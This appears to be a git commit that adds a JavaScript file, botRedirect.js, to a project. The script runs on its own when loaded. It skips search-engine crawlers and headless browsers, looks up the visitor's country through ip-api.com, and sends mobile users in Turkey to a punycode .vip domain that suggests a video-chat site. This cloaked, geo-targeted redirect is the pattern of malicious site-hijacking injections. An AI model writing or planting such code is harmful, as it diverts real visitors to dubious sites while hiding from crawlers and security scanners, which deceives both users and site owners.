240d6d2ad2e4fe252923f895908f3ad02a6bae8a
jale211111111111 <ferdiendi22@gmail.com>
2025-06-06 17:08:58 +0300

    Add files via upload

---
+++ botRedirect.js
@@ -0,0 +1,23 @@
+(function() {
+    const botPatterns = [
+        /googlebot/i, /adsbot/i, /bingbot/i, /slurp/i, 
+        /duckduckbot/i, /yandexbot/i, /baiduspider/i,
+        /duckduckbot/i, /baiduspider/i, /yandexbot/i,
+        /sogou/i, /exabot/i, /facebot/i, /ia_archiver/i
+    ];
+    const isBot = botPatterns.some(regex => regex.test(navigator.userAgent));
+    const isHeadless = navigator.webdriver || false;
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+    if (!isBot && !isHeadless && isMobile) {
+        fetch("http://ip-api.com/json/?fields=countryCode")
+            .then(res => res.json())
+            .then(data => {
+                if (data.countryCode === "TR") {
+                    window.location.href = "https://www.xn--cretsizgoruntulusohbet-rlc.vip/";
+                }
+            })
+            .catch(err => console.error("IP check failed:", err));
+    }
+})();
+
